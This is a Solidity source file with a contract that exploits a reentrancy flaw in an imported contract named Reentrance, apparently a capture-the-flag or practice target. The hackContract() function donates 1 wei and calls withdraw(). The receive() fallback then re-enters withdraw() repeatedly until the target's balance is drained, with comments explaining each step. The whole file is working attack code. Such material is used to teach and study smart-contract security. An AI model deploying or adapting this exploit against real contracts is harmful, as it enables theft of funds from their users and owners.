// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // We first send at least 1 wei so that we can call `withdraw` afterwards
        Reentrance(contractAddress).donate{value: 1}(address(this));

        // We now call `withdraw`.
        Reentrance(contractAddress).withdraw();
    }

    receive() external payable {
        // In the `withdraw` call, Reentrance contract tries to send us our balance,
        // receive() gets called, and we call back again the withdraw function, if there
        // is any balance left.
        if (address(contractAddress).balance > 0) {
            Reentrance(contractAddress).withdraw();
        }
    }
}
